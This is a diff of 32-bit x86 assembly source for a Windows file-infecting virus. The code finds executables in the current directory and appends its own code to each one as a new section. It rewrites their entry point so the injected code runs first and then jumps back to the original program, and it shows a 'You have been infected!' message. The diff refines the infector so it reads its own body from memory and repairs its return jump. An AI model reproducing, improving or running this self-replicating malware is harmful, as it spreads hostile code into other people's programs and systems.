@@ -1,15 +1,16 @@
 include misc.inc
 
-inject SEGMENT read write execute
+inject32 SEGMENT read write execute
 	data_start EQU $
 	
 	; .data
-	strGMFN db 'GetModuleFileNameA', 0
+    selfSectionVA dd 2000h
+
     strF1A db 'FindFirstFileA', 0
     strFNA db 'FindNextFileA', 0
     strFC db 'FindClose', 0
     strCFA db 'CreateFileA', 0
-    strSFP db 'SetFilePointerEx', 0
+    strSFP db 'SetFilePointer', 0
     strCH db 'CloseHandle', 0
     strRF db 'ReadFile', 0
     strWF db 'WriteFile', 0
@@ -23,7 +24,7 @@ inject SEGMENT read write execute
 	strCaption db 'Notice', 0
     strContent db 'You have been infected!', 0
     
-    ishName db '.infect', 0 ; MUST be 8 bytes in length
+    ishName db 'inject32' ; MUST be 8 bytes in length (pad 0 if not) + MUST match segment name
     ishVirtualSize dd 0
     ishVirtualAddress dd 0
     ishSizeOfRawData dd 0
@@ -32,33 +33,40 @@ inject SEGMENT read write execute
     ishPointerToLineNumbers dd 0
     ishNumberOfRelocations dw 0
     ishNumberOfLinenumbers dw 0
-    ishCharacteristics dd 60000060h
-    ; IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
-	; 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
+    ishCharacteristics dd 0E0000040h
+    ; IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
+	; 0x00000040 | 0x20000000 | 0x40000000 | 0x80000000
     
     ; .data?
     tempDword dd 0
     tempDword2 dd 0
     temp320B db 320 DUP(0) ; To store WIN32_FIND_DATAA
     
-    entrySectionOffset EQU $ - data_start
-    
 ; .code
+delta:
+	ret
+
 start:
-    call here
-    here:
+    entrySectionOffset EQU $ - data_start
+
+    call delta
+	postDelta EQU $ - data_start
         
+	mov [esp + stackAddr(old_ebp)], ebp
     mov ebp, esp
     
     ; Allocate space in the stack
     add esp, stackAddr(stack_reserved)
     
-    mov edx, [ebp] ; selfEntry + 1 + 4 (call here is 5 bytes long)
-    sub edx, 5 ; edx = selfEntry
+    mov edx, fromStack(deltaAddr) ; selfEntry + 1 + 4 (call delta is 5 bytes long)
+    sub edx, postDelta - entrySectionOffset ; edx = selfEntry
     toStack selfEntry, edx
     
     sub edx, entrySectionOffset
     toStack selfSection, edx
+    
+    sub edx, paccess(selfSectionVA)
+    toStack selfImageBaseAddress, edx
     
     ; Find kernel32.dll
     ASSUME FS:NOTHING
@@ -113,9 +121,6 @@ start:
     k32import strWF
     toStack fwrite
     
-    k32import strGMFN
-    toStack argv0
-    
     k32import strGLE
     toStack ferror
     
@@ -133,60 +138,41 @@ start:
     push fromStack(user32dll)
     call vfromStack(getaddr)
     toStack msgbox
-    
-    ; Get name of current process
-    push 260						; MAX_PATH
-    push daccess(offset temp320B) 	; To store output
-    push 0 							; Current process
-    call vfromStack(argv0)
-    
-    ; Open current file for READing
-	push 0
-	push 80h			; FILE_ATTRIBUTE_NORMAL
-	push 4				; OPEN_ALWAYS
-	push 0
-	push 1 or 2 or 4	; FILE_SHARE_READ
-	push 40000000h		; GENERIC_READ
-	push daccess(offset temp320B)
-	call vfromStack(fopen)
-	call vfromStack(ferror)
-	toStack selfHand
 	
-	; Find inject section header of current file
-	getval fromStack(selfHand), 4, SEEK_SET, 3Ch
-	mov ebx, vaccess(tempDword) ; ebx = e_lfanew
-	mov eax, ebx
-	add eax, 6
-	getval fromStack(selfHand), 2, SEEK_SET, eax
-	mov edx, vaccess(tempDword) ; edx = NumberOfSections
-	mov eax, ebx
-	add eax, 20
-	getval fromStack(selfHand), 2, SEEK_SET, eax
-	add ebx, vaccess(tempDword) ; ebx = SectionTable #1
-	mov daccess(temp320B), 0
-	invoke fromStack(fseek), fromStack(selfHand), ebx, 0, SEEK_SET
+	; 
+	mov ebx, fromStack(selfImageBaseAddress)
+	add ebx, 3Ch
+	mov ebx, DWORD PTR [ebx] ; ebx = e_lfanew
+	add ebx, fromStack(selfImageBaseAddress) ; ebx = e_lfanew in memory
+	add ebx, 6
+	xor edx, edx
+	mov dx, [ebx] ; edx = NumberOfSections
+	add ebx, 20 - 6
+	xor eax, eax
+	mov ax, [ebx] ; eax = SizeOfOptionalHeader
+	add ebx, 24 - 20 ; ebx = VA OptionalHeader
+	add ebx, eax ; ebx = VA SectionTable #1
+	
+	xor eax, eax
 	section_header_loop:
-		invoke fromStack(fread),
-				fromStack(selfHand),
-				daccess(temp320B),
-				40,
-				daccess(tempDword2),
-				0
-		mov esi, daccess(temp320B)
-		mov edi, daccess(ishName)
+		imul esi, eax, 40
+		add esi, ebx
+		mov edi, daccess(ishName, edi)
 		mov ecx, 8
 		cld
 		repe cmpsb
 		jz section_header_found
 		
-		dec edx
-		cmp edx, 0
-	ja section_header_loop
+		inc eax
+		cmp eax, edx
+	jb section_header_loop
 	
 	section_header_found:
-	mov eax, paccess(offset temp320B + 8)
+	imul esi, eax, 40
+	add esi, ebx
+	mov eax, [esi + 8]
 	toStack selfVirtualSize
-	mov eax, paccess(offset temp320B + 20)
+	mov eax, [esi + 20]
 	toStack selfPointerToRawData
     
     ; Find first file in directory
@@ -221,44 +207,44 @@ start:
 		toStack lfanew
 
 		; Insert new NumberOfSections
-		mov ecx, fromStack(lfanew)
-		add ecx, 6
-		getval fromStack(tgHand), 2, SEEK_SET, ecx
+		mov ebx, fromStack(lfanew)
+		add ebx, 6
+		getval fromStack(tgHand), 2, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack NumberOfSections
 		inc paccess(tempDword)
-			push SEEK_CUR
+			push SEEK_SET
 			push 0
-			push ecx
+			push ebx
 			push fromStack(tgHand)
 		call vfromStack(fseek)
-		push 0
-		push daccess(tempDword2)
-		push 2
-		push daccess(tempDword)
-		push fromStack(tgHand)
+			push 0
+			push daccess(tempDword2)
+			push 2
+			push daccess(tempDword)
+			push fromStack(tgHand)
 		call vfromStack(fwrite)
 
-		add ecx, 20 - 6 ; = lfanew + 20
-		getval fromStack(tgHand), 2, SEEK_SET, ecx
+		add ebx, 20 - 6 ; = lfanew + 20
+		getval fromStack(tgHand), 2, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack SizeOfOptionalHeader
 
-		add ecx, 4 ; = lfanew + 24 = ioh_offset
-		toStack ioh_offset, ecx
-		getval fromStack(tgHand), 2, SEEK_SET, ecx
+		add ebx, 4 ; = lfanew + 24 = ioh_offset
+		toStack ioh_offset, ebx
+		getval fromStack(tgHand), 2, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack Magic
 
-		mov ecx, fromStack(ioh_offset)
-		add ecx, 16
-		getval fromStack(tgHand), 4, SEEK_SET, ecx
+		mov ebx, fromStack(ioh_offset)
+		add ebx, 16
+		getval fromStack(tgHand), 4, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack AddressOfEntryPoint
 
-		mov ecx, fromStack(ioh_offset)
-		add ecx, 32
-		getval fromStack(tgHand), 4, SEEK_SET, ecx
+		mov ebx, fromStack(ioh_offset)
+		add ebx, 32
+		getval fromStack(tgHand), 4, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack SectionAlignment
 
@@ -278,14 +264,14 @@ start:
 		; Obtain lastish.VirtualAddress
 		add ecx, 12
 		getval fromStack(tgHand), 4, SEEK_SET, ecx
-		mov edx, paccess(tempDword)
+		mov ebx, paccess(tempDword)
 
 		; Obtain lastish.SizeOfRawData
 		getval fromStack(tgHand), 4
-		add edx, paccess(tempDword)
+		add ebx, paccess(tempDword)
 
-		closest edx, vfromStack(SectionAlignment)
-		mov daccess(ishVirtualAddress, ebx), eax
+		closest ebx, vfromStack(SectionAlignment)
+		mov paccess(ishVirtualAddress, edx), eax
 
 		mov ecx, fromStack(lastish_offset)
 		add ecx, 40
@@ -300,105 +286,91 @@ start:
 		mov ebx, eax
 		inc eax
 		closest	eax, vfromStack(FileAlignment)
-		mov ecx, eax ; Avoid eax being overwritten later (at daccess()/fwrite())
-		sub ecx, ebx
-		mov daccess(tempDword), 0
+		mov esi, eax ; Avoid eax being overwritten later (at daccess()/fwrite())
+		sub esi, ebx
+		mov paccess(tempDword), 0
 		pad1_loop:
+				push 0
+				push daccess(tempDword2)
+				push 1
+				push daccess(tempDword)
+				push fromStack(tgHand)
+			call vfromStack(fwrite)
+			dec esi
+			cmp esi, 0
+		ja pad1_loop
+			push SEEK_CUR
+			push 0
+			push 0
+			push fromStack(tgHand)
+		call vfromStack(fseek)
+		mov paccess(ishPointerToRawData, ecx), eax
+		
+		; Write selfSectionVA
 			push 0
 			push daccess(tempDword2)
-			push 1
-			push daccess(tempDword)
+			push 4
+			push daccess(ishVirtualAddress)
 			push fromStack(tgHand)
-			call vfromStack(fwrite)
-			dec ecx
-			cmp ecx, 0
-		ja pad1_loop
-				push SEEK_CUR
-				push 0
-				push 0
-				push fromStack(tgHand)
-			call vfromStack(fseek)
-		mov daccess(ishPointerToRawData, ecx), eax
+		call vfromStack(fwrite)
 
 		; Copy .inject
 		mov ecx, fromStack(selfVirtualSize)
-			push SEEK_SET
+		sub ecx, 4 + 5
+		; Already written selfSection VA
+		; No copying last jmp instruction to old AddressOfEntryPoint (along with nop's)
 			push 0
-			push fromStack(selfPointerToRawData)
-			push fromStack(selfHand)
-		call vfromStack(fseek)
-		copy_start:
-			cmp ecx, 320
-			jbe copy_end
+			push daccess(tempDword2)
+			push ecx
+				mov eax, fromStack(selfSection)
+				add eax, 4
+			push eax
+			push fromStack(tgHand)
+		call vfromStack(fwrite)
 			
-				push 0
-				push daccess(tempDword2)
-				push 320
-				push daccess(temp320B)
-				push fromStack(selfHand)
-			call vfromStack(fread)
-			
-				push 0
-				push daccess(tempDword2)
-				push 320
-				push daccess(temp320B)
-				push fromStack(tgHand)
-			call vfromStack(fwrite)
-			
-			sub ecx, 320
-		jmp copy_start
-		copy_end:
-			sub ecx, 6 ; No copying last jmp instruction to old AddressOfEntryPoint (along with nop's)
-			
-				push 0
-				push daccess(tempDword2)
-				push ecx
-				push daccess(temp320B)
-				push fromStack(selfHand)
-			call vfromStack(fread)
-			
-				push 0
-				push daccess(tempDword2)
-				push ecx
-				push daccess(temp320B)
-				push fromStack(tgHand)
-			call vfromStack(fwrite)
-			
-			; Final jmp instruction:
-			; FF 65 XX = jmp [ebp + disp8] (3 bytes) (for 32-bit, only usable if stack_reserved < 32 = 0x20)
-			; FF A5 XX XX XX XX = jmp [ebp + disp32] (6 bytes)
-			mov paccess(tempDword), 0A5FFh
-				push 0
-				push daccess(tempDword2)
-				push 4
-				push daccess(tempDword)
-				push fromStack(tgHand)
-			call vfromStack(fwrite)
-			
-			mov ebx, fromStack(AddressOfEntryPoint)
-			mov paccess(tempDword), ebx
-				push 0
-				push daccess(tempDword2)
-				push 4
-				push daccess(tempDword)
-				push fromStack(tgHand)
-			call vfromStack(fwrite)
-			
-		; Register VirtualSize & SizeOfRawData
-				push SEEK_CUR
-				push 0
-				push 0
-				push fromStack(tgHand)
-			call vfromStack(fseek) ; Obtain current position
+		; Final jmp instruction:
+		; E9 XX XX XX XX = jmp disp32 (5 bytes)
+		mov paccess(tempDword), 0E9h
+			push 0
+			push daccess(tempDword2)
+			push 1
+			push daccess(tempDword) ; jmp
+			push fromStack(tgHand)
+		call vfromStack(fwrite)
+		
+		mov ebx, vfromStack(AddressOfEntryPoint)
+			push SEEK_CUR
+			push 0
+			push 0
+			push fromStack(tgHand)
+		call vfromStack(fseek) ; Obtain current position
 		sub eax, paccess(ishPointerToRawData, ecx)
-		mov daccess(ishVirtualSize, ecx), eax	
+		add eax, paccess(ishVirtualAddress, ecx)
+		add eax, 4 ; eax = RVA of end of this JMP instruction
+		sub ebx, eax ; ebx = Difference between this JMP instruction and oldEntryPoint
+		mov paccess(tempDword), ebx
+			push 0
+			push daccess(tempDword2)
+			push 4
+			push daccess(tempDword) ; oldEntryPoint
+			push fromStack(tgHand)
+		call vfromStack(fwrite)
+		
+		; Register VirtualSize & SizeOfRawData
+			push SEEK_CUR
+			push 0
+			push 0
+			push fromStack(tgHand)
+		call vfromStack(fseek) ; Obtain current position
+		sub eax, paccess(ishPointerToRawData, ecx)
+		mov paccess(ishVirtualSize, ecx), eax	
 		closest	eax, vfromStack(FileAlignment)
-		mov daccess(ishSizeOfRawData, ecx), eax
+		mov paccess(ishSizeOfRawData, ecx), eax
 
 		; Pad section
-		mov ecx, eax
-		sub ecx, paccess(ishVirtualSize)
-		mov daccess(tempDword), 0
+		mov esi, eax
+		sub esi, paccess(ishVirtualSize)
+		mov paccess(tempDword), 0
 		pad2_loop:
 				push 0
 				push daccess(tempDword2)
@@ -407,8 +379,8 @@ start:
 				push fromStack(tgHand)
 			call vfromStack(fwrite)
 			
-			dec ecx
-			cmp ecx, 0
+			dec esi
+			cmp esi, 0
 		ja pad2_loop
 
 		; Write new Section Header
@@ -431,7 +403,7 @@ start:
 		mov eax, paccess(tempDword)
 		add eax, paccess(ishSizeOfRawData, ecx)
 		closest eax, vfromStack(SectionAlignment)
-		mov daccess(tempDword, ecx), eax
+		mov paccess(tempDword, ecx), eax
 			push SEEK_SET
 			push 0
 			push ebx
@@ -445,10 +417,11 @@ start:
 		call vfromStack(fwrite)
 		
 		; Edit AddressOfEntryPoint
-		sub ebx, 56 - 16
+		mov ebx, fromStack(ioh_offset)
+		add ebx, 16
 		mov edx, paccess(ishVirtualAddress)
 		add edx, entrySectionOffset
-		mov daccess(tempDword), edx
+		mov paccess(tempDword), edx
 			push SEEK_SET
 			push 0
 			push ebx
@@ -473,8 +446,6 @@ start:
     jne openFile
     
     ; No more file to write
-    	push fromStack(selfHand)
-    call vfromStack(fclose)
     	push fromStack(fileHand)
     call vfromStack(ffind0)
     
@@ -487,10 +458,9 @@ start:
     
     to_exit:
     mov esp, ebp
+    mov ebp, [esp + stackAddr(old_ebp)]
     jmp exit ; expected to be 5 bytes
-    nop
-    
-inject ENDS
+inject32 ENDS
 
 .code
 exit:
